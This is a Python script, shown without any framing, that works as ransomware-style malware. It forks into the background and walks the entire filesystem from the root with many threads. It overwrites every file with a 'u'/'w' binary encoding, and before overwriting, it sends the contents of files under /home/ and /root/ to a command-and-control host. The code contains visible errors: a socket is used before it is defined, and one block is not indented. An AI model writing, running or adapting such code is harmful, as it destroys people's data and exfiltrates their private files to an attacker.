#!/bin/python3
import os
import threading
import math
import socket

c2_addr=""
c2_port=9001

exc=[]
threads=[]
max_t=500


c.settimeout(3)
if c2_addr !="":
  try:
      c=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      c.connect((c2_addr, c2_port))
  except:
      c=False

def toBinary(a):
  l,m=[],[]
  for i in a:
    l.append(ord(str(i)))
  for i in l:
    m.append(int(bin(i)[2:]))
  return m

def toString(a):
    l=[]
    m=""
    for i in a:
        b=0
        c=0
        k=int(math.log10(i))+1
        for j in range(k):
            b=((i%10)*(2**j))   
            i=i//10
            c=c+b
        l.append(c)
    for x in l:
        m=m+chr(x)
    return m

def decode(file):
        try:
                with open(file, "r") as f:
                    x=f.read().replace("u", "1").replace("w", "0").split()
                content=str(toString(list(map(int, x))))
                content=content.replace("EOL", "\n")
                with open(file, "w") as f:
                    f.write(content)
        except:
                pass

def encode(file):
    try:
        with open(file, "r") as f:
            x=f.read().replace("\n", "EOL")
            content = " ".join(map(str, toBinary(x))).replace("1", "u").replace("0", "w")
        if c:
            if "/home/" in file or "/root/" in file:
            c.send(str(file).encode() + b"\n" + str(content).encode() + b"\nEOF\n")
        with open(file, "w") as f:
            f.write(content)
    except:
        pass

def enc_dir(ep="/"):
    exc.append(ep)
    for root, dirs, files in os.walk(ep):
        for f in files:
            encode(os.path.join(root, f))
        for d in dirs:
            if os.path.join(root, d) not in exc:
                if len(threads) < max_t:
                    t=threading.Thread(target=enc_dir, args=(os.path.join(root, d),))
                    t.start()
                    threads.append(t)
                else:
                    enc_dir(os.path.join(root, d))

pid = os.fork()
if pid >0:
    exit(0)
t=threading.Thread(target=enc_dir)
t.start()
threads.append(t)
print("uwu...")
for t in threads:
    t.join()
    del t
print("uwu!!!")
if c:
    c.close()
